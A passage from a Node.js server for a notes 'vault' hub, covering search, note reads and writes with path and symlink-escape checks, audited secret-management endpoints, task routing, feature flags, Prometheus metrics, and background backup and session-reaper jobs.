  p.stderr.on('data', (c) => { err += c.toString('utf8'); });
  p.on('close', (code) => {
    if (code !== 0 && code !== 1) {
      // git diff exits 1 when there ARE differences — that's not an error.
      // Only treat other non-zero as failure.
      return send(res, 500, { error: 'git failed', detail: err.slice(0, 200) });
    }
    send(res, 200, { path: rel, diff: Buffer.concat(chunks).toString('utf8') });
  });
}

// vt-0140: ingest path moved from the standalone tokmon-ingest container.
// Auth is the separate VAULT_RAG_TOKMON_INGEST_TOKEN — shippers don't hold
// the viewer or admin bearer.
async function handleTokmonIngest(req, res) {
  const auth = req.headers['x-tokmon-token']
    || (req.headers.authorization || '').replace(/^Bearer\s+/i, '');
  if (!TOKMON_INGEST_TOKEN || !sharedTokenEqual(auth, TOKMON_INGEST_TOKEN)) {
    return send(res, 401, { error: 'unauthorized' });
  }
  if (!fleetCtx.tokmonDb) {
    return send(res, 503, { error: 'tokmon db not configured' });
  }
  const body = await readBody(req);
  if (!body || !Array.isArray(body.events)) {
    return send(res, 422, { error: 'events[] required' });
  }
  if (body.events.length > 5000) {
    return send(res, 413, { error: 'batch too large (max 5000)' });
  }
  const filtered = body.events.filter(e => tokmonRoutes.isPlausibleTs(e.ts));
  const dropped = body.events.length - filtered.length;
  const result = await tokmonRoutes.ingestBulk(fleetCtx.tokmonDb, filtered);
  if (dropped) result.dropped_implausible_ts = dropped;
  send(res, 200, { ok: true, ...result });
}

async function handleSecretGet(body, req) {
  if (!body.name) throw new Error('name required');
  try {
    const value = await secretsBackend().get(body.name);
    await auditSecret(req, 'get', body.name, 'ok');
    return { value };
  } catch (e) {
    await auditSecret(req, 'get', body.name, mapOutcome(e));
    if (e instanceof NotFound || e.statusCode === 404) { const err = new Error(e.message); err.code = 404; throw err; }
    throw e;
  }
}

async function handleSecretList(_body, req) {
  try {
    const names = await secretsBackend().list();
    await auditSecret(req, 'list', null, 'ok');
    return { names };
  } catch (e) {
    await auditSecret(req, 'list', null, mapOutcome(e));
    throw e;
  }
}

async function handleSecretSet(body, req) {
  if (!body.name) throw new Error('name required');
  if (body.value === undefined || body.value === null) throw new Error('value required');
  try {
    const committed_sha = await secretsBackend().set(body.name, body.value);
    await auditSecret(req, 'set', body.name, 'ok');
    return { committed_sha };
  } catch (e) {
    await auditSecret(req, 'set', body.name, mapOutcome(e));
    throw e;
  }
}

async function handleSecretDelete(body, req) {
  if (!body.name) throw new Error('name required');
  try {
    const committed_sha = await secretsBackend().delete(body.name);
    await auditSecret(req, 'delete', body.name, 'ok');
    return { committed_sha };
  } catch (e) {
    await auditSecret(req, 'delete', body.name, mapOutcome(e));
    if (e instanceof NotFound || e.statusCode === 404) { const err = new Error(e.message); err.code = 404; throw err; }
    throw e;
  }
}

async function handleSecretRotate(body, req) {
  if (!body.name) throw new Error('name required');
  const newValue = body.value === undefined ? null : body.value;
  try {
    const committed_sha = await secretsBackend().rotate(body.name, newValue);
    await auditSecret(req, 'rotate', body.name, 'ok');
    return { committed_sha };
  } catch (e) {
    await auditSecret(req, 'rotate', body.name, mapOutcome(e));
    throw e;
  }
}

async function handleSecretVerify(_body, req) {
  try {
    const out = await secretsBackend().verify();
    await auditSecret(req, 'verify', null, 'ok');
    return out;
  } catch (e) {
    await auditSecret(req, 'verify', null, mapOutcome(e));
    throw e;
  }
}

async function handleSearch(body) {
  const query = String(body.query || '').trim();
  if (!query) throw new Error('query required');
  const k = Math.min(Math.max(parseInt(body.k, 10) || 8, 1), 50);
  const tags = Array.isArray(body.tags) ? body.tags : null;

  const [emb] = await lib.embed([query], 'query');
  const params = [lib.vec(emb)];
  let where = '';
  if (tags && tags.length) { where = 'WHERE tags && $2'; params.push(tags); }
  params.push(k);
  const sql = `
    SELECT path, idx, text, fm, tags, 1 - (emb <=> $1::vector) AS score
    FROM chunks
    ${where}
    ORDER BY emb <=> $1::vector
    LIMIT $${params.length}
  `;
  const r = await withPg(c => c.query(sql, params));
  return { results: r.rows };
}

async function handleGet(body) {
  const p = safeRel(String(body.path || '').trim());
  const full = path.join(VAULT, p);
  if (!full.startsWith(VAULT + path.sep) && full !== VAULT) throw new Error('bad path');
  if (!fs.existsSync(full)) throw new Error('not found');
  // vt-0183: realpath check — match handlePut. A pre-existing symlink
  // could otherwise let a GET leak content from outside the vault root.
  const realFull = fs.realpathSync(full);
  if (!realFull.startsWith(VAULT + path.sep) && realFull !== VAULT) {
    throw new Error('bad path (symlink escape)');
  }
  const text = fs.readFileSync(full, 'utf8');
  const stat = fs.statSync(full);
  // vt-0141: round-trip sha so callers (Fleet UI editor) can send it back
  // as expected_sha on PUT for optimistic concurrency.
  return { path: p, text, mtime: stat.mtime.toISOString(), size: stat.size, sha: sha256(text) };
}

async function handleBacklinks(body) {
  const target = String(body.target || '').trim();
  if (!target) throw new Error('target required');
  const r = await withPg(c => c.query(
    'SELECT source FROM backlinks WHERE target=$1 ORDER BY source',
    [target]
  ));
  return { target, sources: r.rows.map(x => x.source) };
}

// vt-0153: per-path in-process mutex serialises the expected_sha check +
// the writeFileSync that follows it. Without this, two PUTs targeting the
// same file can both pass the SHA gate before either writes, producing a
// last-writer-wins (the second writer is the "winner" but its merge was
// computed against stale shaBefore). The lock is in-memory only — it does
// NOT protect against external writers (Obsidian-Git auto-sync); that
// race is bounded by vault-sync.sh's debounce window and accepted.
const _pathLocks = new Map();
async function withPathLock(key, fn) {
  const prev = _pathLocks.get(key) || Promise.resolve();
  let release;
  const next = new Promise((r) => { release = r; });
  const chain = prev.then(() => next);
  _pathLocks.set(key, chain);
  try {
    await prev;
    return await fn();
  } finally {
    release();
    // Only clear if no one else queued behind us (chain still on top).
    if (_pathLocks.get(key) === chain) _pathLocks.delete(key);
  }
}

async function handlePut(body, req) {
  // vt-0173: normalize lock key for case-insensitive filesystems (macOS
  // dev/CI). Without this, "Foo.md" and "foo.md" get separate locks but
  // hit the same file → race resurrected.
  const lockKey = String(body.path || '').toLowerCase();
  return await withPathLock(lockKey, () => handlePutLocked(body, req));
}
async function handlePutLocked(body, req) {
  const agent_id = body.agent_id ? String(body.agent_id).trim() : null;
  const relPath  = String(body.path || '').trim();
  const content  = String(body.content || '');
  const fmPatch  = body.frontmatter && typeof body.frontmatter === 'object' ? body.frontmatter : {};
  const mode     = body.mode || 'upsert';
  const reindex  = body.reindex !== false;

  if (!relPath.endsWith('.md')) throw new Error('path must end with .md');

  // vt-0161: admin bearer bypasses WRITABLE_PREFIXES — the prefix list was
  // a safety rail for unsupervised agents, but a human admin in the Fleet
  // UI should be able to edit any vault file.
  // vt-0162: CRITICAL fix — checkAdminAuth fallbacks to viewer when
  // FLEET_ADMIN_TOKEN is unset (see fleet-routes.js:77-78), which would
  // mean every viewer-authed PUT bypasses the prefix gate. Require admin
  // token to be EXPLICITLY configured before honoring isAdmin.
  const isAdmin = req && FLEET_ADMIN_TOKEN && fleetRoutes.checkAdminAuth(req, fleetCtx);
  // vt-0162: even admin must NOT write directly to secrets/ via /put — that
  // path is for encrypted blobs managed by the secrets handler (which writes
  // through a separate code path) or recipients (managed via secret_set).
  // A misclick that overwrites secrets/vault.age would destroy the entire
  // encrypted store.
  const isProtectedPath = relPath.startsWith('secrets/');
  if (isProtectedPath) {
    const err = new Error('secrets/ is managed via /api/secrets/* — direct /put refused');
    err.code = 403; throw err;
  }
  const finalRel = isAdmin ? safeRel(relPath) : resolveWritePath(agent_id, relPath);
  const full = path.join(VAULT, finalRel);
  if (!full.startsWith(VAULT + path.sep)) throw new Error('bad path');
  // I8 (audit pass 2): a pre-existing symlink anywhere in the chain (planted
  // by the indexer, a misbehaving agent, or a foreign process) would let a
  // PUT escape the vault root. Resolve the actual on-disk path of the parent
  // dir and verify it's still under VAULT before opening.
  if (fs.existsSync(full)) {
    const realFull = fs.realpathSync(full);
    if (!realFull.startsWith(VAULT + path.sep)) throw new Error('bad path (symlink escape)');
  } else {
    let parent = path.dirname(full);
    while (parent && parent.startsWith(VAULT)) {
      if (fs.existsSync(parent)) {
        const realParent = fs.realpathSync(parent);
        if (!realParent.startsWith(VAULT + path.sep) && realParent !== VAULT) {
          throw new Error('bad path (symlink escape)');
        }
        break;
      }
      parent = path.dirname(parent);
    }
  }

  const exists = fs.existsSync(full);
  if (mode === 'create' && exists) {
    const err = new Error('already exists');
    err.code = 409;
    throw err;
  }

  const now = new Date().toISOString();
  const existingRaw = exists ? fs.readFileSync(full, 'utf8') : '';
  const shaBefore = exists ? sha256(existingRaw) : null;
  // vt-0141: optimistic concurrency. If the caller passes expected_sha, the
  // current on-disk SHA must match — otherwise this is a mid-air collision
  // (Obsidian-Git push + Fleet UI editor both writing the same note). 412 lets
  // the UI show a "reload from server / force overwrite" conflict modal.
  // expected_sha is meaningless on the create path (mode === 'create' already
  // 409s on exists), and null/undefined means "no concurrency check" so old
  // callers keep working.
  // vt-0154: treat empty-string expected_sha as "no check" (same as undefined/
  // null). A client that wires up a form binding may send '' instead of
  // omitting the field; rejecting every PUT in that case was a footgun.
  if (body.expected_sha !== undefined && body.expected_sha !== null && body.expected_sha !== ''
      && exists && mode !== 'create' && body.expected_sha !== shaBefore) {
    const err = new Error(`stale write: expected_sha=${body.expected_sha} but current=${shaBefore}`);
    err.code = 412;
    throw err;
  }
  const { fm: existingFm, body: existingBody } = exists
    ? lib.parseFrontmatter(existingRaw)
    : { fm: {}, body: '' };

  const { fm: incomingFm, body: incomingBody } = lib.parseFrontmatter(content);

  const autoFm = {
    ...(exists ? {} : { created: now, source: 'rag-api', ...(agent_id ? { agent_id } : {}) }),
    updated: now,
  };

  const finalBody = mode === 'append' && exists
    ? (existingBody.trimEnd() + '\n\n' + incomingBody.trimStart())
    : incomingBody;

  const finalFm = lib.mergeFrontmatter(
    lib.mergeFrontmatter(existingFm, incomingFm),
    lib.mergeFrontmatter(fmPatch, autoFm)
  );

  fs.mkdirSync(path.dirname(full), { recursive: true });
  const out = lib.serializeFrontmatter(finalFm, finalBody);
  fs.writeFileSync(full, out, 'utf8');
  const bytes = Buffer.byteLength(out, 'utf8');
  const shaAfter = sha256(out);
  const op = exists ? mode : 'create';

  let chunks = 0, links = 0;
  if (reindex) {
    const r = await withPg(c => lib.upsertFile(c, finalRel, finalBody, finalFm));
    chunks = r.chunks; links = r.links;
  }

  try {
    await withPg(c => c.query(
      `INSERT INTO vault_audit (agent_id, path, op, sha_before, sha_after, bytes)
       VALUES ($1,$2,$3,$4,$5,$6)`,
      [agent_id, finalRel, op, shaBefore, shaAfter, bytes]
    ));
  } catch (e) {
    log.error('audit_insert_failed', { msg: e.message });
  }

  gitSync.trigger(VAULT);

  return {
    path: finalRel,
    bytes,
    status: exists ? 'updated' : 'created',
    chunks,
    links,
  };
}

const ROUTES = {
  '/search':          handleSearch,
  '/get':             handleGet,
  '/backlinks':       handleBacklinks,
  '/put':             handlePut,
  '/secrets/get':     handleSecretGet,
  '/secrets/list':    handleSecretList,
  '/secrets/set':     handleSecretSet,
  '/secrets/delete':  handleSecretDelete,
  '/secrets/rotate':  handleSecretRotate,
  '/secrets/verify':  handleSecretVerify,
};

// vt-0317: server-side feature enforcement. Without this map, disabling
// `vault_rag` via PATCH /fleet/features hid the nav but /api/search
// kept responding — operator's "off" wasn't off. Map route → feature
// name. Routes not listed here are core (always on). Lookup goes
// through fleet-db's 30s feature cache → negligible per-request cost.
const ROUTE_FEATURES = {
  '/search':          'vault_rag',
  '/get':             'vault_rag',
  '/backlinks':       'vault_rag',
  '/put':             'vault_rag',
  '/secrets/get':     'secrets',
  '/secrets/list':    'secrets',
  '/secrets/set':     'secrets',
  '/secrets/delete':  'secrets',
  '/secrets/rotate':  'secrets',
  '/secrets/verify':  'secrets',
};
const fleetDbLib = require('./lib/fleet-db');
async function _featureEnabled(name) {
  if (!pg) return true;  // pre-pg-boot → don't block
  try { return await fleetDbLib.isFeatureEnabled(pg, name); }
  catch { return true; }  // fail-open: don't lock operator out on a feature-table glitch
}

const TASK_ROUTES = {
  '/task/create':  'create',
  '/task/list':    'list',
  '/task/ready':   'ready',
  '/task/show':    'show',
  '/task/claim':   'claim',
  '/task/close':   'close',
  '/task/update':  'update',
  '/task/dep_add': 'dep_add',
  '/task/dep_rm':  'dep_rm',
};

const fleetCtx = fleetRoutes.makeContext({ token: TOKEN, adminToken: FLEET_ADMIN_TOKEN, db: null, version: '0.1.0' });

// vt-0227: stable route templates for /metrics labels. Any segment that
// looks like a uuid, sha, or note-path is collapsed to ":id" / ":sha"
// / ":path". Unknown top-level paths are bucketed to ":other" so an
// attacker can't grow the label set with a crafted URL.
const UUID_RE = /^[0-9a-f-]{36}$/i;
const SHA_RE  = /^[0-9a-f]{8,64}$/i;
function routeTemplate(path) {
  if (!path || path === '/') return '/';
  const parts = path.split('/').filter(Boolean);
  // Known top-level prefixes for the hub API.
  const TOP = new Set([
    'healthz', 'readyz', 'metrics', 'search', 'get', 'put', 'backlinks',
    'secrets', 'task', 'notes', 'fleet', 'audit', 'workflows', 'tokmon', 'mcp',
  ]);
  if (!TOP.has(parts[0])) return '/:other';
  return '/' + parts.map(p => {
    if (UUID_RE.test(p)) return ':id';
    if (SHA_RE.test(p))  return ':sha';
    if (p.endsWith('.md')) return ':note';
    return p;
  }).join('/');
}

// vt-0211: Prometheus metrics.
const metrics = require('./lib/metrics');
const _reqCount = metrics.counter('rag_api_requests_total', 'HTTP requests by method+status', ['method', 'status']);
const _reqDur = metrics.histogram('rag_api_request_duration_ms', 'HTTP request duration', ['path'],
  [10, 25, 50, 100, 250, 500, 1000, 2500, 10000]);
const _pgPool = metrics.gauge('rag_api_pg_pool_total', 'pg pool size (total / idle)', ['state']);
metrics.counter('rag_api_secret_ops_total', 'Secret ops by op+outcome', ['op', 'outcome']);
// vt-0271-followup: pg_backup_last_ok_seconds = mtime of the freshest
// `/backups/vault_rag-*.dump`. Consumed by the PgBackupStale vmalert
// rule (fires if older than 36h). Gauge stays at 0 if the directory
// is missing / empty (alert will fire — that's the intent).
const _pgBackupGauge = metrics.gauge('pg_backup_last_ok_seconds',
  'epoch seconds when the freshest pg_dump was last written (0 = no backup found)');
// vt-0298: per-audit-table size gauges. No retention enforced on
// vault_audit / secret_audit / workflow_audit / auth_audit today
// (cleanup-vault-audit.js handles vault_audit only). Exposing size
// lets vmalert page when any of them crosses 1 GB.
const _auditTableBytes = metrics.gauge('audit_table_bytes',
  'pg_total_relation_size for each audit table', ['table']);
// vt-0303: WAL archive observability.
//   pg_wal_archive_lag_seconds = now - mtime of newest WAL file.
//   pg_wal_archive_bytes       = total size of /backups/wal/ dir.
// Stale archive (lag > 10 min) means archive_command is failing OR
// archive_timeout is misconfigured. Alert fires per vmalert rule.
const _walLag   = metrics.gauge('pg_wal_archive_lag_seconds',
  'seconds since the newest WAL segment in /backups/wal/ (0 = no segments yet)');
const _walBytes = metrics.gauge('pg_wal_archive_bytes',
  'total size of /backups/wal/');
// vt-0318: workflow concurrency observability.
const _workflowActive = metrics.gauge('workflow_active_runs',
  'in-flight workflow runs (status NOT IN done/failed/cancelled)');
const _workflowCap = metrics.gauge('workflow_concurrency_cap',
  'configured VAULT_RAG_WORKFLOW_MAX_CONCURRENT value');
setInterval(() => {
  if (pg && pg.totalCount !== undefined) {
    _pgPool.set({ state: 'total' }, pg.totalCount);
    _pgPool.set({ state: 'idle' }, pg.idleCount);
    _pgPool.set({ state: 'waiting' }, pg.waitingCount);
  }
  try {
    const dir = '/backups';
    const files = fs.existsSync(dir)
      ? fs.readdirSync(dir).filter(n => /^vault_rag-.+\.dump$/.test(n))
      : [];
    let newest = 0;
    for (const n of files) {
      try {
        const st = fs.statSync(path.join(dir, n));
        if (st.mtimeMs > newest) newest = st.mtimeMs;
      } catch {}
    }
    _pgBackupGauge.set({}, newest ? Math.floor(newest / 1000) : 0);
  } catch (e) {
    log.warn('pg_backup_gauge_scan_failed', { msg: e.message });
  }
  // vt-0318: workflow active count gauge (best-effort, no error if pg not ready).
  if (pg) {
    pg.query(`SELECT COUNT(*)::int AS n FROM fleet_workflow_runs WHERE status NOT IN ('done','failed','cancelled')`)
      .then(r => {
        _workflowActive.set({}, r.rows[0].n);
        _workflowCap.set({}, parseInt(process.env.VAULT_RAG_WORKFLOW_MAX_CONCURRENT || '5', 10));
      })
      .catch(() => {});
  }
  // vt-0303: WAL archive lag + total size.
  // vt-0317: sentinel value (10 years) when no segments exist so the
  // WalArchiveStale alert fires on a TOTAL archive failure instead of
  // staying silent at 0. archive_mode=on with 0 segments after boot
  // is a real failure mode (archive_command broken from line 1).
  try {
    const walDir = '/backups/wal';
    if (fs.existsSync(walDir)) {
      let newestMtime = 0, totalBytes = 0, count = 0;
      for (const n of fs.readdirSync(walDir)) {
        try {
          const st = fs.statSync(path.join(walDir, n));
          if (!st.isFile()) continue;
          count += 1;
          totalBytes += st.size;
          if (st.mtimeMs > newestMtime) newestMtime = st.mtimeMs;
        } catch {}
      }
      if (newestMtime) {
        _walLag.set({}, Math.max(0, Math.floor((Date.now() - newestMtime) / 1000)));
      } else {
        // Empty dir → "10 years stale" sentinel so the alert fires.
        // 0 would have masked the failure.
        _walLag.set({}, 315360000);
      }
      _walBytes.set({}, totalBytes);
    } else {
      // /backups/wal not mounted at all — same sentinel.
      _walLag.set({}, 315360000);
      _walBytes.set({}, 0);
    }
  } catch (e) {
    log.warn('wal_gauge_scan_failed', { msg: e.message });
  }
}, 5000).unref?.();

// vt-0298: refresh audit-table size gauges every 5 min — pg_total_relation_size
// is cheap (catalog read) but no need to do it more often than that. Initial
// run scheduled 30s after boot so the metric is populated quickly (pg may
// not be ready at module init).
async function _refreshAuditSizes() {
  if (!pg) return;
  try {
    const r = await pg.query(
      `SELECT tablename, pg_total_relation_size(quote_ident(tablename))::bigint AS bytes
         FROM pg_tables
        WHERE schemaname = 'public'
          AND tablename IN ('vault_audit','secret_audit','workflow_audit','auth_audit','ingest_log','webhook_deliveries')`);
    for (const row of r.rows) {
      _auditTableBytes.set({ table: row.tablename }, Number(row.bytes) || 0);
    }
  } catch (e) {
    log.warn('audit_size_gauge_failed', { msg: e.message });
  }
}
setInterval(_refreshAuditSizes, 5 * 60 * 1000).unref?.();
setTimeout(_refreshAuditSizes, 30_000).unref?.();

const server = http.createServer(async (req, res) => {
  if (req.url && req.url.startsWith('/api/')) req.url = req.url.slice(4);
  // Tag every request with an id; emit one JSON line per response.
  const reqId = requestId(req.headers);
  res.setHeader('X-Request-Id', reqId);
  const t0 = Date.now();
  res.on('finish', () => {
    const path = (req.url || '').split('?')[0];
    // Skip noisy probes from request log.
    if (path === '/healthz' || path === '/readyz' || path === '/metrics') return;
    const ms = Date.now() - t0;
    _reqCount.inc({ method: req.method, status: String(res.statusCode) });
    // vt-0227: collapse high-cardinality path segments (UUIDs, sha hashes,
    // free-form note paths) into a stable route template. Without this,
    // every unique session/host/note id is a permanent map entry → memory
    // leak + scrape size blow-up.
    _reqDur.observe({ path: routeTemplate(path) }, ms);
    log.info('http_request', { req_id: reqId, method: req.method, path, status: res.statusCode, ms });
  });
  if (req.method === 'GET' && req.url === '/healthz') return send(res, 200, { ok: true });
  // vt-0211: prometheus scrape endpoint. No auth — exposes only counts/
  // durations/pool stats, not data. Should be IP-allowlisted by the
  // reverse proxy if exposed publicly.
  if (req.method === 'GET' && req.url === '/metrics') {
    res.writeHead(200, { 'content-type': 'text/plain; version=0.0.4' });
    res.end(metrics.exposition());
    return;
  }
  // vt-0209: /readyz returns 503 until pg + secrets backend are reachable.
  // Separate from /healthz (which is liveness — "process is alive"); readyz
  // is readiness — "process can serve requests". Container orchestrators
  // (docker-compose healthcheck, k8s readinessProbe) should target THIS
  // endpoint to avoid routing traffic to a half-booted hub.
  if (req.method === 'GET' && req.url === '/readyz') {
    return handleReadyz(req, res).catch(e => {
      log.error('readyz_error', { msg: e.stack || e.message });
      send(res, 503, { ok: false, error: scrubError(e.message) });
    });
  }
  // vt-0224: serve workflow-templates/index.json. Static — read on every
  // request; the file lives in the repo, ships with the image.
  if (req.method === 'GET' && req.url === '/workflows/templates') {
    if (!checkAuth(req) && !(FLEET_ADMIN_TOKEN && fleetRoutes.checkAdminAuth(req, fleetCtx))) {
      return send(res, 401, { error: 'unauthorized' });
    }
    // Path search: repo dev (../workflow-templates) → docker mount (/workflow-templates)
    try {
      const candidates = [
        path.join(__dirname, '..', 'workflow-templates', 'index.json'),
        '/workflow-templates/index.json',
      ];
      let data = null;
      for (const p of candidates) {
        if (fs.existsSync(p)) { data = fs.readFileSync(p, 'utf8'); break; }
      }
      if (!data) return send(res, 503, { error: 'workflow-templates not mounted' });
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(data);
    } catch (e) { send(res, 500, { error: scrubError(e.message) }); }
    return;
  }
  // vt-0221: unified audit feed for the Audit UI.
  if (req.method === 'GET' && req.url.startsWith('/audit')) {
    return handleAuditFeed(req, res).catch(e => {
      log.error('audit_endpoint_error', { msg: e.stack || e.message });
      send(res, 500, { error: scrubError(e.message) });
    });
  }
  // vt-0193: detailed health endpoint for the Health dashboard UI.
  // Reports per-subsystem status without requiring secret-store reveals;
  // viewer bearer suffices.
  if (req.method === 'GET' && req.url.startsWith('/healthz/detail')) {
    if (!checkAuth(req) && !(FLEET_ADMIN_TOKEN && fleetRoutes.checkAdminAuth(req, fleetCtx))) {
      return send(res, 401, { error: 'unauthorized' });
    }
    return handleHealthDetail(req, res).catch(e => {
      log.error('healthz_detail_error', { msg: e.stack || e.message });
      send(res, 500, { error: scrubError(e.message) });
    });
  }
  // fleet routes (HTTP) — own dispatch handles auth + methods
  if (fleetRoutes.tryDispatch(req, res, fleetCtx)) return;
  // vt-0140: tokmon shipper ingest — uses its OWN token (X-Tokmon-Token header
  // or Bearer fallback), separate from the API/admin bearer. Lives before the
  // generic POST-only filter so shippers can hit it without holding the
  // viewer/admin bearer.
  if (req.method === 'POST' && req.url === '/tokmon/ingest'
      && process.env.VAULT_RAG_TOKMON_INGEST_ENABLED !== '0') {
    return handleTokmonIngest(req, res).catch(e => {
      log.error('tokmon_ingest_error', { msg: e.stack || e.message });
      send(res, e.statusCode || 500, { error: scrubError(e.message) });
    });
  }
  // vt-0146: GET /api/notes/list — directory listing for the Fleet UI vault
  // tab. Filesystem walk under VAULT (no DB dependency on vault_files which
  // doesn't exist). Optional tag overlay from chunks.
  if (req.method === 'GET' && req.url.startsWith('/notes/list')) {
    return handleNotesList(req, res).catch(e => {
      log.error('notes_list_error', { msg: e.stack || e.message });
      send(res, e.statusCode || 500, { error: scrubError(e.message) });
    });
  }
  // vt-0158: basename→path index for wiki-link resolution.
  // vt-0315: graph subgraph endpoint
  if (req.method === 'GET' && req.url.startsWith('/notes/graph')) {
    return handleNotesGraph(req, res).catch(e => {
      log.error('notes_graph_dispatch_error', { msg: e.stack || e.message });
      send(res, e.statusCode || 500, { error: scrubError(e.message) });
    });
  }
  if (req.method === 'GET' && req.url.startsWith('/notes/index')) {
    return handleNotesIndex(req, res).catch(e => {
      log.error('notes_index_error', { msg: e.stack || e.message });
      send(res, e.statusCode || 500, { error: scrubError(e.message) });
    });
  }
  // vt-0158: per-file git history.
  if (req.method === 'GET' && req.url.startsWith('/notes/history')) {
    return handleNotesHistory(req, res).catch(e => {
      log.error('notes_history_error', { msg: e.stack || e.message });
      send(res, e.statusCode || 500, { error: scrubError(e.message) });
    });
  }
  // vt-0158: blob at sha for diffing previous revisions.
  if (req.method === 'GET' && req.url.startsWith('/notes/show')) {
    return handleNotesShow(req, res).catch(e => {
      log.error('notes_show_error', { msg: e.stack || e.message });
      send(res, e.statusCode || 500, { error: scrubError(e.message) });
    });
  }
  // vt-0159: unified diff (patch for one commit, or arbitrary range).
  if (req.method === 'GET' && req.url.startsWith('/notes/diff')) {
    return handleNotesDiff(req, res).catch(e => {
      log.error('notes_diff_error', { msg: e.stack || e.message });
      send(res, e.statusCode || 500, { error: scrubError(e.message) });
    });
  }
  if (req.method !== 'POST') return send(res, 405, { error: 'method not allowed' });
  // vt-0163: accept EITHER viewer bearer OR admin bearer at the outer gate.
  // Pre-fix, when VAULT_RAG_FLEET_ADMIN_TOKEN was set, this check rejected
  // admin tokens outright — making the vt-0161 "admin can edit any vault
  // file" feature dead in the configuration it was designed for. Mirrors
  // fleet-routes.js:1361.
  if (!checkAuth(req) && !(FLEET_ADMIN_TOKEN && fleetRoutes.checkAdminAuth(req, fleetCtx))) {
    return send(res, 401, { error: 'unauthorized' });
  }
  // VT task routes (vt-rest-mcp) — dispatched separately.
  if (TASK_ROUTES[req.url]) {
    const name = TASK_ROUTES[req.url];
    const handler = vtRoutes.handlers[name];
    if (!handler) return send(res, 404, { error: `no handler: ${name}` });
    try {
      const body = await readBody(req);
      // vt-0166: serialize task mutations through withPathLock so a
      // concurrent /api/put on the same task file (vt-NNNN-slug.md) can't
      // race with task_create/update/close. Key by body.id when present
      // (specific task) else by route (covers list/ready scans).
      const lockKey = body && body.id
        ? `04-tasks/${String(body.id).toLowerCase()}`
        : `__task_route__:${name}`;
      const out = await withPathLock(lockKey, () => handler({ vault: VAULT, body }));
      send(res, out.status, out.body);
    } catch (e) {
      log.error('task_route_error', { url: req.url, msg: e.stack || e.message });
      send(res, e.statusCode || 500, { error: scrubError(e.message || String(e)) });
    }
    return;
  }

  const handler = ROUTES[req.url];
  if (!handler) return send(res, 404, { error: 'not found' });
  // vt-0317: feature flag gate. Reject 503 when the route's feature is
  // disabled — operator's "off" in /fleet/features now actually means
  // off, not "UI-hide-only". Fail-open on lookup error.
  const featureKey = ROUTE_FEATURES[req.url];
  if (featureKey && !(await _featureEnabled(featureKey))) {
    return send(res, 503, { error: `feature '${featureKey}' is disabled` });
  }
  try {
    const body = await readBody(req);
    // vt-0142: handlers may opt into receiving the raw req (for caller-id
    // fingerprint + via attribution in the audit log). Signature is
    // (body, req) so legacy 1-arg handlers stay working.
    const out = await handler(body, req);
    send(res, 200, out);
  } catch (e) {
    log.error('route_error', { url: req.url, msg: e.message });
    const code = e.statusCode || (e.code && Number.isInteger(e.code) ? e.code : 400);
    send(res, code, { error: scrubError(e.message) });
  }
});

// I10 (audit pass 2): strip pg connection details ("host=...", "port=...",
// "user=...") and absolute file paths from error messages before they reach
// the wire. Server-side logs keep the full message via log.error.
function scrubError(msg) {
  if (!msg) return 'internal error';
  return String(msg)
    .replace(/\bhost\s*=\s*\S+/gi, 'host=<redacted>')
    .replace(/\bport\s*=\s*\d+/gi, 'port=<redacted>')
    .replace(/\buser\s*=\s*\S+/gi, 'user=<redacted>')
    .replace(/(connection terminated|ECONNREFUSED|ETIMEDOUT)[\s\S]{0,200}/gi, '$1')
    .slice(0, 500);
}

// WS upgrade for fleet
fleetRoutes.attachUpgrade(server, () => fleetCtx);

(async () => {
  if (!SKIP_PG) {
    try { await pgConnect(); }
    catch (e) { log.error('pg_connect_deferred', { msg: e.message }); pg = null; }
  }
  // Connect to tokmon DB for cost queries (best-effort; cost endpoints return 503 if missing)
  let tokmonPg = null;
  if (!SKIP_PG) {
    try {
      tokmonPg = new Pool({
        ...PG, database: process.env.VAULT_RAG_TOKMON_DB || 'tokmon',
        max: parseInt(process.env.VAULT_RAG_TOKMON_POOL_MAX || '4', 10),
        idleTimeoutMillis: 30_000,
      });
      // vt-0278: tokmon ingest can write big batches — 60s is the cap.
      const TOKMON_STMT_TIMEOUT_MS = parseInt(process.env.VAULT_RAG_TOKMON_STATEMENT_TIMEOUT_MS || '60000', 10);
      tokmonPg.on('connect', (client) => {
        client.query(`SET statement_timeout = ${TOKMON_STMT_TIMEOUT_MS}`).catch(e =>
          log.warn('tokmon_statement_timeout_set_failed', { msg: e.message }));
      });
      await tokmonPg.query('SELECT 1');
      tokmonPg.on('error', (e) => { log.error('tokmon_pool_error', { msg: e.message }); });
      fleetCtx.tokmonDb = tokmonPg;
      console.log(`[rag-api] tokmon db connected for fleet cost ingest`);
    } catch (e) {
      log.error('tokmon_connect_failed', { msg: e.message });
    }
  }
  // Hand pg client to fleet, run orphan flip + schedule retention.
  if (pg) {
    fleetCtx.db = pg;
    try {
      const n = await fleetDb.orphanRunningSessions(pg);
      if (n) console.log(`[rag-api] fleet: orphaned ${n} sessions on startup`);
    } catch (e) {
      log.error('fleet_orphan_check_failed', { msg: e.message });
    }
    // Retention runs only after pg is bound. If pg failed to connect at boot,
    // retention never starts — rag-api must restart once pg is reachable.
    try {
      const { startRetention } = require('./lib/fleet-retention');
      startRetention(pg);
      console.log('[rag-api] fleet metrics retention started');
    } catch (e) {
      log.error('retention_start_failed', { msg: e.message });
    }
    // vt-0206: heartbeat reaper for sessions + workflow_runs. Runs every
    // 5 minutes. Catches daemon crashes that don't trigger hub restart.
    const REAPER_INTERVAL_MS = 5 * 60 * 1000;
    const webhooks = require('./lib/webhooks');
    const reaperTimer = setInterval(async () => {
      try {
        const sn = await fleetDb.reapStuckSessions(pg);
        if (sn) console.log(`[rag-api] reaper: orphaned ${sn} stuck sessions`);
      } catch (e) {
        log.error('session_reaper_failed', { msg: e.message });
      }
      try {
        const wfDb = require('./lib/fleet-workflow-db');
        const rn = await wfDb.reapStuckRuns(pg);
        if (rn) console.log(`[rag-api] reaper: failed ${rn} stuck workflow_runs`);
      } catch (e) {
        log.error('run_reaper_failed', { msg: e.message });
      }
      // vt-0223: emit host.offline webhook for hosts whose last_seen drifted
      // past the staleness threshold since the previous tick.
      try {
        const stale = (await pg.query(
          `SELECT name FROM fleet_hosts
            WHERE status = 'online'
              AND last_seen < now() - interval '3 minutes'`
        )).rows;
        if (stale.length) {
          await pg.query(`UPDATE fleet_hosts SET status='offline' WHERE name = ANY($1)`, [stale.map(r => r.name)]);
          for (const h of stale) webhooks.emit(pg, 'host.offline', { host_name: h.name }).catch(() => {});
        }
      } catch (e) {
        log.error('host_offline_detector_failed', { msg: e.message });
      }
